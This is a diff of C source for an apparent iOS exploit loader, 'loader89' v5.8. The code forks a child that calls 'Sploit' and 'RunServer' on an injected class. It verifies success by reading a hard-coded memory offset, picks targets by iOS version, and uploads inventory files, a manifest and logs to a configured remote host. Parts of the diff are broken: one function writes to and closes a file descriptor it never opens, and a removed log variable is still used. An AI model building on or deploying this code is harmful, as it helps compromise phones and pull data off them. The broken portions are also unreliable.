@@ -27,6 +27,7 @@ extern char *getenv(const char *);
 extern int strcmp(const char *, const char *);
 extern int dup2(int, int);
 extern int fflush(void *);
+extern int atoi(const char *);
 extern unsigned int _dyld_image_count(void);
 extern const void *_dyld_get_image_header(unsigned int);
 extern const char *_dyld_get_image_name(unsigned int);
@@ -57,12 +58,26 @@ static void *(*p_sel)(const char *);
 static void *(*p_nslog)();
 static void *(*p_retain)(void *);
 static void *(*p_release)(void *);
-static int g_logfd = -1;
+/* v5.8: exploit success state, written by child/worker,
+ * read by parent for manifest + FINAL line. 0=idle, 1=running,
+ * 2=success, 3=fail, 4=timeout */
+static volatile int g_exploit_state = 0;
+#define EXPLOIT_ST_IDLE    0
+#define EXPLOIT_ST_RUN    1
+#define EXPLOIT_ST_OK     2
+#define EXPLOIT_ST_FAIL   3
+#define EXPLOIT_ST_TIMEOUT 4
+static int g_mha_leases = 0;
+static char g_sts_statuspath[512];
+/* v5.8 problem B fix: fallback thread reads this static struct,
+ * the old stack-local copy was a dangling-pointer risk. */
+static struct exploit_thread_args {
+    void *acqCls;
+    void *core;
+} g_exploit_args;
 static char g_logpath[512];
 static char g_host[128];
 static int g_port = LOADER89_DEFAULT_PORT;
-static volatile int g_exploit_state = 0; /* 0=idle, 1=running, 2=success, 3=fail */
-static int g_mha_leases = 0;
 
 static void raw_log(const char *s) {
     if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
@@ -465,17 +480,29 @@ static void repair_core_log_sink(void *core) {
     log_info(msg);
 }
 
-static int exploit_core_ok(void *core) {
+/* v5.8 problem A fix: separate "base resolved" from "raw flag read".
+ * return 0 = hard failure (no core handle / no raw==0); never treat
+ * a resolver error as exploit success. Detailed state goes to *out_raw /
+ * *out_resolved so callers and the status file can distinguish them. */
+static int exploit_core_ok(void *core, int *out_raw, int *out_resolved) {
+    if (out_raw) *out_raw = -1;
+    if (out_resolved) *out_resolved = 0;
     /* dlopen() returns an opaque handle, not a Mach-O image base.
        Reuse the v4.3/v4.4 resolver here as well; reading directly from
        the handle caused SIGSEGV in the child exploit chain. */
     if (!core) return 0;
     unsigned char *base = 0;
-    if (!resolve_core_base(core, &base)) return 2;
+    if (!resolve_core_base(core, &base)) {
+        log_warn("core NOT FOUND; not counted as success");
+        return 0;
+    }
+    if (out_resolved) *out_resolved = 1;
     unsigned char *flag = base + 0x6b96d8;
-    int ok = (*flag == 0);
+    int raw = *flag;
+    if (out_raw) *out_raw = raw;
+    int ok = (raw == 0);
     char msg[300];
-    snprintf(msg, sizeof(msg), "core base=%p flag addr=%p raw=%d ok=%d", (void *)base, (void *)flag, (int)*flag, ok);
+    snprintf(msg, sizeof(msg), "core base=%p flag addr=%p raw=%d ok=%d", (void *)base, (void *)flag, raw, ok);
     log_info(msg);
     return ok;
 }
@@ -484,19 +511,87 @@ static int exploit_core_ok(void *core) {
  * Disassembly shows: objc_getClass(AcqViewCntrlr_) -> Sploit -> RunServer.
  * No alloc/init and no InitLogs are called by the original host. */
 static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root);
+
+struct exploit_status {
+    int sploit_done;
+    int runserver_done;
+    int core_base_resolved;
+    int raw_flag;      /* -1 = unreadable, otherwise raw value at flag addr */
+    int succeeded;     /* 1 only when core_base_resolved && raw_flag == 0 */
+};
+
+static struct exploit_status g_exploit_sts = {0, 0, 0, -1, 0};
+
+/* v5.8 problem C fix: child writes a status file; parent reads it
+ * instead of guessing success from the exit code alone. */
+static void write_child_status(void) {
+    if (!g_sts_statuspath[0]) return;
+    char buf[512];
+    int n = snprintf(buf, sizeof(buf),
+        "{\"sploit_done\":%d,\"runserver_done\":%d,\"core_base_resolved\":%d,"
+        "\"raw_flag\":%d,\"success\":%d}",
+        g_exploit_sts.sploit_done, g_exploit_sts.runserver_done,
+        g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag, g_exploit_sts.succeeded);
+    if (n <= 0) return;
+    unsigned long off = 0;
+    while (off < (unsigned long)n) {
+        long r = write(fd, buf + off, (unsigned long)n - off);
+        if (r <= 0) break;
+        off += (long)r;
+    }
+    close(fd);
+}
+
+/* v5.8: parent side — parse the child's status JSON. We only need
+ * booleans; simple "key":N matching is enough and stays dependency-free. */
+static int read_child_status(void) {
+    if (!g_sts_statuspath[0]) return 0;
+    g_exploit_sts.succeeded = 0;
+    g_exploit_sts.core_base_resolved = 0;
+    g_exploit_sts.raw_flag = -1;
+    g_exploit_sts.sploit_done = 0;
+    g_exploit_sts.runserver_done = 0;
+    int fd = open(g_sts_statuspath, O_RDONLY);
+    if (fd < 0) return 0;
+    char buf[512];
+    long n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return 0;
+    buf[n] = 0;
+    const char *v;
+    if ((v = strstr(buf, "\"core_base_resolved\":"))) g_exploit_sts.core_base_resolved = atoi(v + 20);
+    if ((v = strstr(buf, "\"raw_flag\":"))) g_exploit_sts.raw_flag = atoi(v + 11);
+    if ((v = strstr(buf, "\"sploit_done\":"))) g_exploit_sts.sploit_done = atoi(v + 14);
+    if ((v = strstr(buf, "\"runserver_done\":"))) g_exploit_sts.runserver_done = atoi(v + 17);
+    if ((v = strstr(buf, "\"success\":"))) g_exploit_sts.succeeded = atoi(v + 10);
+    /* Problem A guard one more time: never claim success unless the base
+     * was resolved AND raw == 0, no matter what the file says. */
+    if (g_exploit_sts.succeeded && !(g_exploit_sts.core_base_resolved && g_exploit_sts.raw_flag == 0))
+        g_exploit_sts.succeeded = 0;
+    char msg[220];
+    snprintf(msg, sizeof(msg), "child status file: sploit=%d runserver=%d resolved=%d raw=%d success=%d",
+             g_exploit_sts.sploit_done, g_exploit_sts.runserver_done,
+             g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag, g_exploit_sts.succeeded);
+    log_info(msg);
+    return g_exploit_sts.succeeded;
+}
+
 static int exploit_class_main(void *acqCls, void *core) {
     if (!acqCls) return 2;
     log_info("Sploit before");
     p_msgSend(acqCls, p_sel("Sploit"));
     log_info("Sploit after");
-    int ok1 = exploit_core_ok(core);
+    g_exploit_sts.sploit_done = 1;
+    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
     log_info("RunServer before");
     p_msgSend(acqCls, p_sel("RunServer"));
     log_info("RunServer after");
-    int ok2 = exploit_core_ok(core);
-    int ok = ok1 || ok2;
-    char msg[180];
-    snprintf(msg, sizeof(msg), "exploit class-chain result sploit_flag=%d runserver_flag=%d ok=%d", ok1, ok2, ok);
+    g_exploit_sts.runserver_done = 1;
+    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
+    int ok = g_exploit_sts.succeeded;
+    char msg[220];
+    snprintf(msg, sizeof(msg), "exploit class-chain result succeeded=%d resolved=%d raw=%d", ok,
+             g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
     log_info(msg);
     if (ok) {
         upload_manifest(1, 0, "exploit-class", 0);
@@ -505,15 +600,11 @@ static int exploit_class_main(void *acqCls, void *core) {
     return 6;
 }
 
-struct exploit_thread_args {
-    void *acqCls;
-    void *core;
-};
-
 static void *exploit_thread_worker(void *arg) {
     struct exploit_thread_args *a = (struct exploit_thread_args *)arg;
     int rc = exploit_class_main(a->acqCls, a->core);
-    g_exploit_state = (rc == 0) ? 2 : 3;
+    write_child_status();
+    g_exploit_state = (rc == 0) ? EXPLOIT_ST_OK : EXPLOIT_ST_FAIL;
     return (void *)(long)rc;
 }
 
@@ -903,8 +994,20 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v5.7 original-class-chain-safe start ===");
+    log_info("=== loader89 v5.8 status-file-and-policy start ===");
     read_runtime_config();
+    {
+        /* v5.8 problem C: child/worker exploit state goes to this file;
+         * parent never guesses success from the exit code alone. */
+        char *home = getenv("HOME");
+        if (home) {
+            char *p = cat3(home, "/Documents/.loader89_exploit_status.json", "");
+            unsigned long i = 0;
+            for (; i < sizeof(g_sts_statuspath) - 1 && p[i]; i++) g_sts_statuspath[i] = p[i];
+            g_sts_statuspath[i] = 0;
+            free(p);
+        }
+    }
     char msg[600], bid[200];
     snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
     log_info(msg);
@@ -929,19 +1032,41 @@ static void *worker(void *arg) {
 
     int exploit_ok = 0;
     int ios_major = ios_major_version();
+    int ios_minor = -1, ios_patch = -1;
+    {
+        char buf[32];
+        sysctl_str("kern.osproductversion", buf, sizeof(buf));
+        int v[3] = {0, 0, 0}, vi = 0;
+        for (unsigned long i = 0; buf[i]; i++) {
+            if (buf[i] >= '0' && buf[i] <= '9') { if (vi < 3) v[vi] = v[vi] * 10 + (buf[i] - '0'); }
+            else if (++vi == 3) break;
+        }
+        ios_major = v[0]; ios_minor = v[1]; ios_patch = v[2];
+    }
     int exploit_forced = info_int("Loader89EnableExploit", 0);
-    snprintf(msg, sizeof(msg), "iOS major=%d exploit_forced=%d", ios_major, exploit_forced);
+    /* v5.8 problem D fix: policy actually decides whether to run the
+     * exploit at all. Supported by default: iOS <17 and iOS 18.x.
+     * Everything else is skipped unless Loader89EnableExploit=1. */
+    int try_exploit;
+    const char *policy_iOS_range;
+    if (ios_major > 0 && ios_major < 17) { try_exploit = 1; policy_iOS_range = "lt17"; }
+    else if (ios_major == 18) { try_exploit = 1; policy_iOS_range = "18x"; }
+    else { try_exploit = 0; policy_iOS_range = "unsupported"; }
+    if (!try_exploit && exploit_forced) { try_exploit = 1; policy_iOS_range = "forced"; }
+    snprintf(msg, sizeof(msg), "policy=%s policy_iOS_range=%s runtime_iOS_actual=%d.%d.%d decision_try_exploit=%d exploit_forced=%d",
+             policy_iOS_range, policy_iOS_range, ios_major, ios_minor, ios_patch, try_exploit, exploit_forced);
     log_info(msg);
     void *acqCls = p_getClass("AcqViewCntrlr_");
     log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
     int fork_failed = 0;
-    if (acqCls) {
+    if (acqCls && try_exploit) {
         /* RunServer has been seen aborting the whole process.  Run the exploit
          * in an isolated child; if the child aborts, the parent keeps the
          * MHA/MCM fallback alive. */
         pid_t child = fork();
         if (child == 0) {
             int rc = exploit_class_main(acqCls, core);
+            write_child_status();
             _exit(rc);
         } else if (child > 0) {
             snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=12s", (int)child);
@@ -956,14 +1081,20 @@ static void *worker(void *arg) {
                 kill(child, SIGKILL);
                 waitpid(child, &status, 0);
                 log_warn("exploit child TIMEOUT killed");
+            } else {
+                read_child_status();
             }
-            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+            int exited_ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
+            /* v5.8: exit code alone is not success; require the child's
+             * status JSON to say succeeded==1 as well. */
+            if (exited_ok && g_exploit_sts.succeeded) {
                 exploit_ok = 1;
                 log_info("exploit child OK");
             } else {
-                snprintf(msg, sizeof(msg), "exploit child FAIL exited=%d code=%d signal=%d",
+                snprintf(msg, sizeof(msg), "exploit child FAIL exited=%d code=%d signal=%d resolved=%d raw=%d",
                          WIFEXITED(status), WIFEXITED(status) ? WEXITSTATUS(status) : -1,
-                         WIFSIGNALED(status) ? WTERMSIG(status) : 0);
+                         WIFSIGNALED(status) ? WTERMSIG(status) : 0,
+                         g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
                 log_warn(msg);
             }
         } else {
@@ -971,6 +1102,8 @@ static void *worker(void *arg) {
             snprintf(msg, sizeof(msg), "fork FAIL errno=%d (%s); queue direct exploit", errno, strerror(errno));
             log_warn(msg);
         }
+    } else if (acqCls && !try_exploit) {
+        log_warn("exploit chain SKIPPED by policy (iOS unsupported; set Loader89EnableExploit=1 to force)");
     } else {
         log_warn("exploit chain SKIPPED (AcqViewCntrlr_ missing)");
     }
@@ -1037,23 +1170,28 @@ static void *worker(void *arg) {
        fallback is alive, try the exploit once in-process so we can still
        report real exploit_success instead of silently skipping it. */
     if (fork_failed && acqCls) {
-        struct exploit_thread_args ea = { acqCls, core };
+        /* v5.8 problem B fix: worker reads a static struct, so the detached
+         * thread never touches stack memory that dies when we return. */
+        g_exploit_args.acqCls = acqCls;
+        g_exploit_args.core = core;
         void *th = 0;
-        g_exploit_state = 1;
+        g_exploit_state = EXPLOIT_ST_RUN;
         log_info("direct exploit fallback start");
-        if (pthread_create(&th, 0, exploit_thread_worker, &ea) == 0) {
+        if (pthread_create(&th, 0, exploit_thread_worker, &g_exploit_args) == 0) {
             pthread_detach(th);
-            for (int i = 0; i < 12 && g_exploit_state == 1; i++) sleep(1);
-            if (g_exploit_state == 1) {
+            for (int i = 0; i < 12 && g_exploit_state == EXPLOIT_ST_RUN; i++) sleep(1);
+            if (g_exploit_state == EXPLOIT_ST_RUN) {
                 log_warn("direct exploit fallback TIMEOUT; continuing MHA/upload");
                 exploit_ok = 0;
             } else {
-                exploit_ok = (g_exploit_state == 2);
-                snprintf(msg, sizeof(msg), "direct exploit fallback state=%d exploit_ok=%d", g_exploit_state, exploit_ok);
+                read_child_status();
+                exploit_ok = g_exploit_sts.succeeded;
+                snprintf(msg, sizeof(msg), "direct exploit fallback state=%d exploit_ok=%d resolved=%d raw=%d", g_exploit_state, exploit_ok,
+                         g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
                 log_info(msg);
             }
         } else {
-            g_exploit_state = 3;
+            g_exploit_state = EXPLOIT_ST_FAIL;
             log_warn("direct exploit fallback pthread FAIL");
         }
     }
@@ -1065,7 +1203,10 @@ static void *worker(void *arg) {
     write_inventory_files(mcm_root);
     void *up = upload_manifest(exploit_ok, mha_ok, source, mcm_root);
     log_info(up ? "dual-chain upload OK" : "dual-chain upload FAIL");
-    snprintf(msg, sizeof(msg), "FINAL exploit_success=%d mha_success=%d source=%s root=%s", exploit_ok, mha_ok, source, mcm_root);
+    snprintf(msg, sizeof(msg), "FINAL exploit_success=%d mha_success=%d source=%s root=%s resolved=%d raw_flag=%d sploit_done=%d runserver_done=%d policy=%s",
+             exploit_ok, mha_ok, source, mcm_root,
+             g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag,
+             g_exploit_sts.sploit_done, g_exploit_sts.runserver_done, policy_iOS_range);
     log_info(msg);
     post_log_now();
     log_info("=== loader89 done ===");
